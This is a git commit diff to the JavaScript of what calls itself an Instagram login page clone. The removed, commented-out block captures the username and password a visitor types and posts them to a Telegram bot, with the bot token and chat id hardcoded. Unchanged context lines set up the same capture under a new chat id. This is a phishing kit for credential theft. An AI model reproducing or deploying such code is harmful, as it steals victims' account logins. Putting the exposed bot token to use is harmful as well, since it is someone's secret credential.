d75c5b58b5ae86331dcf4e59f9f5fd18c55fbee9
behruz20 <itfrontuchun@gmail.com>
2024-05-30 18:11:58 +0500

    done

--- instagram-login-page-clone-html-css-dio-master/main.js
+++ instagram-login-page-clone-html-css-dio-master/main.js
@@ -1,23 +1,3 @@
-// // 5530572466
-
-// let login_button = document.querySelector('.login-button')
-// let inputs = document.querySelectorAll('input')
-// bot_token = '7168480605:AAH3Q6Fjg3l2BK30_8uQHzIU72VWq5_pu0E'
-
-
-// login_button.addEventListener('click', () => {
-//     fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
-//         method: 'POST',
-//         headers: {
-//             'Content-Type': 'application/json'
-//         },
-//         body: JSON.stringify({
-//             chat_id: '5530572466',
-//             text: `parol:${inputs[0].value} \n password:${inputs[1].value}`
-//     })
-// }).then(res => res.json()).then(data)
-// })
-
 // 6435284364
 let login_button = document.querySelector('.login-button');
 let inputs = document.querySelectorAll('input');
